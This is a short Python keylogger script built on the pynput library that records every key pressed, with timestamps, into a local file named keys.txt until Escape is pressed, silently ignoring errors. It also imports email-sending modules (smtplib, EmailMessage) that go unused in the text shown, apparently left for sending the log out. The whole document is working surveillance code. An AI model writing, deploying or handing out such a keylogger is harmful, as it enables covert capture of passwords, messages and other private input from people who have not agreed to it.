from pynput import keyboard
from datetime import datetime
import os
import smtplib
from email.message import EmailMessage
import mimetypes

def on_press(key):
    try:
        file.write(f"Alphanumeric key pressed: {key.char} at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
    except AttributeError:
        file.write(f"Special key pressed: {str(key)[4:]} {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
try:
    file = open('keys.txt','w')
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
except:
    pass
finally:
    file.close()